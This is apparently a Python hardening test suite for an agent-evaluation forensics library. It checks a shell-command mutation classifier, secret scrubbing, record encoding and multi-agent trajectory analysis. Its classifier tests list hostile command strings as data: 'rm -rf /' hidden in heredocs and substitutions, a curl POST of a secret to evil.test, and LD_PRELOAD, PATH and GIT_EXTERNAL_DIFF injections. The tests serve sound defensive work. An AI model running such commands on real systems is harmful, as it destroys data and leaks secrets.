from __future__ import annotations

import json
from pathlib import Path
from random import Random
from tempfile import TemporaryDirectory
from typing import Any

from evallab.evidence._bespoke_public_io import build_public_world_log, parse_public_agent_steps
from evallab.evidence._forensics_join import find_in_context_steps, join_steps_and_events
from evallab.evidence._forensics_rules import step_observation_corpus
from evallab.evidence._forensics_shell import (
    extract_bash_read_paths,
    is_mutating_shell_cmd,
)
from evallab.evidence._multiagent_io import NormalizedAtifStep, NormalizedToolCall
from evallab.evidence._seatlab_scrub import (
    canonical_sha256,
    encode_bounded_record,
    sanitize_key,
    scrub_text,
    unique_key,
)
from evallab.evidence.bespoke_public_rollout import (
    _build_public_run,
    _decompose_model_runs,
)
from evallab.evidence.harbor_seat_trajectories import _inspect_seat, _steps
from evallab.evidence.multiagent_adapter import (
    MemberRecord,
    MemberUsage,
    NormalizedMultiAgentTrial,
    read_multiagent_trial,
)
from evallab.evidence.seat_cda import analyze_normalized_trial_cda
from evallab.evidence.world_events import NormalizedWorldEvent, WorldEventLog
from evallab.sim.engine import Simulation


def _w_ev(
    seq: int,
    actor: str,
    kind: Any,
    target: str,
    src_fmt: Any,
    raw_kind: str,
    **extra: Any,
) -> NormalizedWorldEvent:
    vis = extra.pop("visibility", "public" if kind == "message_post" else "world_audit")
    return NormalizedWorldEvent(
        seq=seq,
        actor=actor,
        kind=kind,
        target=target,
        visibility=vis,
        source_format=src_fmt,
        raw_kind=raw_kind,
        **extra,
    )


def _check_r15_shell_heredocs_and_lex(sim: Simulation, rng: Random) -> None:
    tag = rng.randint(10, 99)
    for mut_cmd in (
        f"cat << 'EOF_{tag}'\necho '\nEOF_{tag}\nrm -rf / # '",
        f"cat << EOF_{tag}\necho '\nEOF_{tag}\nrm -rf / # '",
        "cat << 'EOF\n'; rm -rf /\nEOF\n",
        "cat << EOF\n'$(rm -rf /)'\nEOF",
        "cat << EOF\n${x:=pwned}\nEOF",
        "cat <<'true' # \\\ntrue\necho PWN > /tmp/h.txt",
        "echo \"$(( a['$(echo PWN > /tmp/a.txt)'] ))\"",
        "echo $(( a['$(echo PWN > /tmp/a.txt)'] ))",
        'echo "$(( `touch /tmp/a.txt` ))"',
        "true \r# ; rm -f f",
        "echo hi >\xa0/dev/null",
        "echo hi >/dev/null\xa0",
    ):
        sim.require(is_mutating_shell_cmd(mut_cmd), "r15_heredoc_and_lex_mutating")
    for ro_cmd in (
        f"cat << 'EOF_{tag}'\nit's literal $(rm -rf /)\nEOF_{tag}",
        "cat << \"E'F\"\nhello\nE'F\necho ok",
        f"cat << EOF_{tag}\nhello $((1 + {tag}))\nEOF_{tag}",
        f'echo "$(( 1 + {tag} ))"',
    ):
        sim.require(not is_mutating_shell_cmd(ro_cmd), "r15_heredoc_readonly")
    sim.require(
        extract_bash_read_paths("cat << \"E'F\"\ncat fake.py\nE'F\ncat real.py") == ["real.py"]
        and extract_bash_read_paths("echo \"$(cat << 'EOF'\ncat fake.py\nEOF\n)\"\ncat real.py")
        == ["real.py"]
        and extract_bash_read_paths("cat << 'EOF'\r\ncat fake.py\r\nEOF\r\ncat real.py\r\n")
        == ["real.py"],
        "r15_heredoc_read_paths",
    )


def _check_r15_shell_cmds_and_env(sim: Simulation, rng: Random) -> None:
    port = rng.randint(8000, 8999)
    for mut_cmd in (
        f"curl -X POST http://h:{port}/api#/done",
        f"curl -X POST http://h:{port}/api?/done",
        f"curl -X POST -d SECRET http://evil.test:{port}/exfil/done",
        'curl -s -X POST -H "X-Seat-Token: $SEAT_TOKEN" -d "{}" "$WORLD_URL/done"',
        f"curl -s -o /dev/null -w '%output{{f}}' http://h:{port}/status",
        f"curl --write-out=%output{{f}} http://h:{port}/status",
        "get /done -o /tmp/x",
        "get /status -X POST",
        "git -C /tmp/r --attr-source status config core.fsmonitor 'echo PWN'",
        "git --unknown-top-flag status",
        "git -C /tmp/r grep -e -- -O/tmp/p.sh",
        "git -C /tmp/r diff -S -- --output=/tmp/p.diff",
        "rg -e -- --pre=/tmp/p.sh f.txt",
        "less -P -- -O /tmp/p.log f.txt",
        "sed -n 'he touch /tmp/x' f.txt",
        "sed -n 'hw /tmp/x' f.txt",
        "sed 'y/a/b/w /tmp/x' f.txt",
        "sed -l -i s/a/b/ f.txt",
        "sed -li s/a/b/ f.txt",
        "sed -l '1w out.txt' f.txt",
        "sed --in-p s/a/b/ f.txt",
        "sed --in-place=.bak s/a/b/ f.txt",
        'GIT_EXTERNAL_DIFF="rm -f f" git diff',
        'LESSOPEN="|rm -f %s" less f.txt',
        "PATH=/tmp cat f.txt",
        "LD_PRELOAD=/tmp/x.so ls",
        "env GIT_EXTERNAL_DIFF=sh git diff",
        "env -P /tmp cat f.txt",
        "./cat f.txt",
        "/tmp/cat f.txt",
        '"$DIR/cat" f.txt',
        "$VAR f.txt",
        "sort $FLAG f.txt /etc/hosts",
        "printf -v PATH %s /tmp",
        "uniq t -",
        "FOO=bar",
    ):
        sim.require(is_mutating_shell_cmd(mut_cmd), "r15_cmd_and_env_mutating")
    for ro_cmd in (
        "/bin/cat f.txt",
        "/usr/bin/cat f.txt",
        "LC_ALL=C sort input.txt",
        "/usr/bin/env LC_ALL=C sort input.txt",
        'curl -s -H "X-Seat-Token: $SEAT_TOKEN" "$WORLD_URL/done"',
        "get /status",
        "git -C /tmp/r --attr-source HEAD status",
        "git -C /tmp/r grep -e -- pat",
        "rg -e -- f.txt",
        "less -P -- -O - f.txt",
        "sed -l 80 's/a/b/p' f.txt",
        "sed -n '1,5p' f.txt",
        "sed 'y/w/e/' f.txt",
        "printf '%s\\n' -v",
        "printf -- '-v\\n'",
        "uniq -",
        "uniq input.txt /dev/null",
    ):
        sim.require(not is_mutating_shell_cmd(ro_cmd), "r15_cmd_and_env_readonly")
    sim.require(
        extract_bash_read_paths("/bin/cat real.py") == ["real.py"]
        and extract_bash_read_paths("./cat real.py") == []
        and extract_bash_read_paths("sed -l 's/a/b/' real.py") == ["real.py"]
        and extract_bash_read_paths("sed -l 80 's/a/b/' real.py") == ["real.py"],
        "r15_read_paths_bin_and_bsd_sed",
    )


def _check_r15_scrub_patterns(sim: Simulation, rng: Random) -> None:
    pad = "t" * rng.randint(155, 190)
    seen: set[str] = set()
    keys = [
        unique_key(sanitize_key(f"{pad}:p1:olam_muster_world:seq{i}"), seen) for i in range(1, 257)
    ]
    sim.require(
        len(set(keys)) == 256
        and all(
            len(k) <= 160 and k.endswith(f":p1:olam_muster_world:seq{i}")
            for i, k in enumerate(keys, 1)
        ),
        "r15_long_trial_keys_unique_and_suffixed",
    )
    k_a = sanitize_key(f"{pad}_alpha:p1:olam_muster_world:seq1")
    k_b = sanitize_key(f"{pad}_bravo:p1:olam_muster_world:seq1")
    sim.require(k_a != k_b and len(k_a) <= 160 and len(k_b) <= 160, "r15_long_trial_distinct_hash")
    tok = f"R15_SECRET_{rng.randint(1000, 9999)}"
    pat_tok = f"github_pat_11ABCDEFG0123456789abcdef_{rng.randint(100000, 999999)}"
    for raw, needle in (
        (f'reward: {{x: [1, "{tok}"]}}, ground_truth: {tok}, secret=\\"{tok}\\"', tok),
        (f'SEAT_TOKEN=\r\n"API_KEY": "{tok}"', tok),
        (f'SEAT_TOKEN=\u2028"API_KEY": "{tok}"', tok),
        (f"SEAT_TOKENS=p1:{tok}_1,p2:{tok}_2,p3:{tok}_3", tok),
        (f'{{"hmac": "{tok}", "hmac_sha256": "{tok}"}}', tok),
        (f"x-hmac-signature: {tok}", tok),
        (f'Log: {{"SEAT_TOKEN_{{p1}}": "{tok}"}}', tok),
        (f'Log: {{"{"k" * 210}_SEAT_TOKEN": "{tok}"}}', tok),
        (f"SEAT_TOKEN='part1'\\''{tok}'", tok),
        (f"hdr: {pat_tok}", "github_pat_"),
        ("\n".join(['{"a":1}'] * 530 + [f'{{"SEAT_TOKEN": "{tok}"}}']), tok),
    ):
        out = scrub_text(raw, max_chars=8000)
        sim.require(needle not in out and "[redacted]" in out, "r15_scrub_redteam_variants")
    nan_scrubbed = scrub_text(f'{{"secret": "{tok}", "v": NaN, "inf": Infinity}}')
    sim.require(
        tok not in nan_scrubbed and "NaN" not in nan_scrubbed and '"v":null' in nan_scrubbed,
        "r15_scrub_json_nan_sanitized",
    )


def _check_r15_bounded_encode(sim: Simulation) -> None:
    sim.require(
        canonical_sha256({"t": (float("nan"), 7)}) == canonical_sha256({"t": [None, 7]}),
        "r15_tuple_nan_sanitized",
    )
    v_u = {
        "actor": "p1",
        "canonical_seat": "p1",
        "received_messages": [{"text": "a\u2028b\u2029c"}],
    }
    rec_u: dict[str, Any] = {"schema": "seatlab.decision/v1", "key": "k", "role": "p1", "view": v_u}
    raw_u = encode_bounded_record(rec_u)
    dec_u = json.loads(raw_u.decode("utf-8"))
    sim.require(
        len(raw_u.decode("utf-8").splitlines()) == 1
        and dec_u["view_sha256"] == rec_u["view_sha256"] == canonical_sha256(rec_u["view"]),
        "r15_bounded_record_u2028_and_missing_sha",
    )
    big_rec: dict[str, Any] = {
        "schema": "seatlab.decision/v1",
        "key": "k2",
        "role": "p1",
        "view": {
            "actor": "p1",
            "canonical_seat": "p1",
            "received_messages": [{"text": "x" * 60000} for _ in range(90)],
        },
    }
    raw_big = encode_bounded_record(big_rec)
    sim.require(
        len(raw_big) - 1 <= 4 * 1024 * 1024
        and big_rec["view_sha256"] == canonical_sha256(big_rec["view"]),
        "r15_bounded_record_trim_syncs_caller_view",
    )


def _check_r15_trajectories(sim: Simulation) -> None:
    issues: list[str] = []
    n_st, by_src, n_tc = _steps(
        {
            "steps": [
                {"step_id": 0, "source": "system"},
                {"step_id": 1, "source": "agent", "tool_calls": [{"id": "c1"}]},
                {"step_id": 2, "source": "tool"},
            ]
        },
        issues,
    )
    sim.require(
        issues == [] and n_st == 3 and by_src == {"agent": 1, "system": 1, "tool": 1} and n_tc == 1,
        "r15_atif_step0_and_tool_source",
    )
    bad_issues: list[str] = []
    _steps({"steps": [{"step_id": -1, "source": "tool"}]}, bad_issues)
    sim.require("non_monotonic_step_id" in bad_issues, "r15_atif_neg_step_rejected")
    with TemporaryDirectory() as tmp:
        td = Path(tmp) / "trial0"
        tpath = td / "seats" / "p1" / "agent" / "trajectory.json"
        tpath.parent.mkdir(parents=True)
        traj_doc = {
            "schema_version": "ATIF-v1.2",
            "session_id": "sess-0",
            "agent": {"name": "test-agent"},
            "steps": [
                {"step_id": 0, "source": "user"},
                {"step_id": 1, "source": "agent", "tool_calls": [{"name": "bash"}]},
                {"step_id": 2, "source": "tool"},
            ],
        }
        tpath.write_text(json.dumps(traj_doc), encoding="utf-8")
        inspected = _inspect_seat(
            td,
            {
                "seat": "p1",
                "under_test": True,
                "trajectory": {"status": "present", "path": "seats/p1/agent/trajectory.json"},
            },
        )
        sim.require(
            inspected["status"] == "valid"
            and inspected["issues"] == []
            and inspected["steps_by_source"] == {"agent": 1, "tool": 1, "user": 1},
            "r15_inspect_seat_trajectories_step0_tool",
        )


def _check_r15_olam_stalls(sim: Simulation) -> None:
    with TemporaryDirectory() as tmp:
        td_s = Path(tmp) / "trial_stall"
        (td_s / "seats" / "p1" / "agent").mkdir(parents=True)
        (td_s / "seats" / "p2" / "agent").mkdir(parents=True)
        (td_s / "seats" / "p1" / "agent" / "trajectory.json").write_text(
            '{"torn": ', encoding="utf-8"
        )
        (td_s / "seats" / "p1" / "agent" / "exit-code.txt").write_text("00\n", encoding="utf-8")
        (td_s / "seats" / "p2" / "agent" / "exit-code.txt").write_text("+0\n", encoding="utf-8")
        res_doc = {
            "trial_name": "trial_stall",
            "finished_at": "2026-11-24T00:10:00",
            "seat_results": [
                {
                    "seat": "p1",
                    "agent_info": {"name": "terminus-2", "model_info": {"name": "m1"}},
                    "exception_info": {"exception_type": "AgentTimeoutError"},
                },
                {
                    "seat": "p2",
                    "agent_info": {"name": "ScriptAgent"},
                    "exception_info": {"exception_type": "AgentTimeoutError"},
                },
            ],
        }
        (td_s / "result.json").write_text(json.dumps(res_doc), encoding="utf-8")
        parsed = read_multiagent_trial(td_s)
        sim.require(
            "stalled_seat_timeout:p1" in parsed.anomalies
            and "stalled_seat_timeout:p2" not in parsed.anomalies
            and not any("exit" in a for a in parsed.anomalies),
            "r15_olam_torn_traj_stall_and_zero_exit",
        )


def _check_r15_public_atif(sim: Simulation) -> None:
    st = parse_public_agent_steps(
        "a2",
        {
            "steps": [
                {"step_id": 0, "source": "system"},
                {
                    "step_id": 1,
                    "source": "agent",
                    "tool_calls": [{"function_name": "inbox", "arguments": '{"limit":5}'}],
                },
                {
                    "step_id": 2,
                    "source": "tool",
                    "message": '{"messages": [{"seq": 0, "text": "m0"}, {"seq": 1, "text": "m1"}]}',
                },
                {
                    "step_id": 3,
                    "source": "agent",
                    "tool_calls": [{"function_name": "bash", "arguments": '{"command":"ls"}'}],
                    "observation": {"results": [{"content": [{"type": "text", "text": "out"}]}]},
                },
            ]
        },
    )
    board = {
        "steps": [
            {"step_id": 0, "source": "a1", "message": "m0"},
            {"step_id": 1, "source": "a2", "message": "m1"},
        ]
    }
    wl = build_public_world_log(board, {"a2": st}, {})
    sim.require(
        [s.step_id for s in st] == [0, 1, 2, 3]
        and st[3].tool_calls[0].arguments == {"command": "ls"}
        and st[3].observations[0].content == "out"
        and [e.msg_id for e in wl.events if e.kind == "message_post"] == ["0", "1"]
        and [e.fetched_msg_ids for e in wl.events if e.kind == "message_fetch"] == [["0", "1"]],
        "r15_public_step0_str_args_and_tool_fetch",
    )


def _check_r15_tool_join(sim: Simulation) -> None:
    tc = NormalizedToolCall(tool_call_id="c1", function_name="msgs")
    ag_st = NormalizedAtifStep(member_id="p1", step_id=1, source="agent", tool_calls=[tc])
    tl_st = NormalizedAtifStep(
        member_id="p1", step_id=2, source="tool", message='{"id": 1, "text": "box 3 open"}'
    )
    p_ev = _w_ev(
        1, "p2", "message_post", "msgs", "olam_muster_world", "msg", msg_id="1", text="box 3 open"
    )
    f_ev = _w_ev(
        2, "p1", "message_fetch", "msgs", "olam_muster_world", "msgs", fetched_msg_ids=["1"]
    )
    _, ev2step = join_steps_and_events({"p1": [ag_st, tl_st]}, [p_ev, f_ev], [], {"p1", "p2"})
    in_ctx = find_in_context_steps(
        {("olam_muster_world", "1"): p_ev},
        {("p1", "olam_muster_world", "1"): f_ev},
        {"p1": [ag_st, tl_st]},
        ev2step,
    )
    sim.require(
        "box 3 open" in step_observation_corpus(tl_st)
        and ev2step.get(("olam_muster_world", 2)) == 1
        and in_ctx.get(("p1", "olam_muster_world", "1")) == 2,
        "r15_tool_step_corpus_and_join",
    )


def _check_r15_public_rollout(sim: Simulation) -> None:
    kw: dict[str, Any] = {
        "task_slug": "t1",
        "task_title": "T1",
        "model_slug": "m1",
        "model_name": "Model 1",
        "harness": "h1",
        "mark_hours": [1.0, 2.0],
        "base_dir": None,
        "attachments": {"r0/a1.json": {"steps": []}},
    }
    ag0 = {
        "id": "a1",
        "trajectoryPath": "r0/a1.json",
        "inputTokens": 100,
        "outputTokens": 50,
        "steps": 9,
    }
    r0 = _build_public_run(
        {
            "runId": "r0",
            "teamSize": 1,
            "setting": "control",
            "rollout": 0,
            "metrics": {"score": 0.25, "costUsd": 1.0, "marks": [0.1, 0.25]},
            "agents": [ag0],
        },
        **kw,
    )
    rt = _build_public_run(
        {
            "runId": "rt",
            "teamSize": 4,
            "setting": "team",
            "rollout": 2,
            "metrics": {"score": 0.75, "costUsd": 4.0, "marks": [0.4, 0.75]},
            "agents": [{"id": "a1", "inputTokens": 400, "outputTokens": 200, "steps": 8}],
        },
        **kw,
    )
    dec = _decompose_model_runs("t1", "m1", [r0, rt], [1.0, 2.0])
    sim.require(
        r0.rollout == 0
        and r0.trial.members[0].n_steps == 0
        and dec.solo_mean == 0.25
        and dec.control_mean is None
        and dec.team_mean == 0.75
        and dec.total_gain == 0.5,
        "r15_bespoke_k1_control_and_empty_steps",
    )


def _check_r15_seat_cda_handoff_and_echo(sim: Simulation) -> None:
    ms = [
        MemberRecord(member_id=f"p{i}", ran_model=True, usage=MemberUsage(cost_status="missing"))
        for i in (1, 2, 3)
    ]
    trial = NormalizedMultiAgentTrial(
        trial_dir="/tmp/t", trial_name="t", ecosystem="olam_seats", members=ms
    )
    cf = "harbor_crucible_audit"
    evs_ho = [
        _w_ev(1, "p1", "artifact_write", "a.py", cf, "workspace_commit", files=["a.py"]),
        _w_ev(
            2,
            "p1",
            "message_post",
            "channel:public",
            cf,
            "chat_public",
            msg_id="2",
            text="Scan sector S4 and extend a.py",
        ),
        _w_ev(
            3, "p2", "message_fetch", "channel:public", cf, "message_read", fetched_msg_ids=["2"]
        ),
        _w_ev(4, "p2", "world_read", "a.py", cf, "workspace_read", files=["a.py"]),
        _w_ev(5, "p2", "world_action", "sector:S4", cf, "mine"),
        _w_ev(
            6,
            "p2",
            "artifact_write",
            "a.py",
            cf,
            "workspace_commit",
            files=["a.py"],
            overwrites_actor="p1",
        ),
    ]
    r_ho = analyze_normalized_trial_cda(
        trial, WorldEventLog(event_log_present=True, source_formats=[cf], events=evs_ho)
    )
    sim.require(
        not r_ho.messages[0].ignored
        and r_ho.messages[0].contradicted_actions == 0
        and r_ho.edges[0].outcome != "ignored",
        "r15_cda_sequential_handoff_not_ignored",
    )
    mf = "olam_muster_world"
    evs_ec = [
        _w_ev(1, "p1", "message_post", "c", mf, "msg", msg_id="1", text="Check room 7"),
        *[
            _w_ev(i, "p2", "message_post", "c", mf, "msg", msg_id=str(i), text="Check room 7")
            for i in (2, 3, 4, 5)
        ],
        _w_ev(
            6, "p3", "message_fetch", "msgs", mf, "msgs", fetched_msg_ids=["1", "2", "3", "4", "5"]
        ),
        _w_ev(
            7, "p3", "world_action", "open:room=7,box=1", mf, "open", detail={"room": 7, "box": 1}
        ),
    ]
    r_ec = analyze_normalized_trial_cda(
        trial, WorldEventLog(event_log_present=True, source_formats=[mf], events=evs_ec)
    )
    sim.require(
        r_ec.triggered_actions == 1
        and r_ec.sender_causal_credit == {"p1": 1.0, "p2": 0.0, "p3": 0.0},
        "r15_cda_echo_spam_no_credit_inflation",
    )


def check_r15_hardening(sim: Simulation, rng: Random) -> None:
    sim.begin("r15_hardening")
    _check_r15_shell_heredocs_and_lex(sim, rng)
    _check_r15_shell_cmds_and_env(sim, rng)
    _check_r15_scrub_patterns(sim, rng)
    _check_r15_bounded_encode(sim)
    sim.begin("r15_redteam_regressions")
    _check_r15_trajectories(sim)
    _check_r15_olam_stalls(sim)
    _check_r15_public_atif(sim)
    _check_r15_tool_join(sim)
    _check_r15_public_rollout(sim)
    _check_r15_seat_cda_handoff_and_echo(sim)
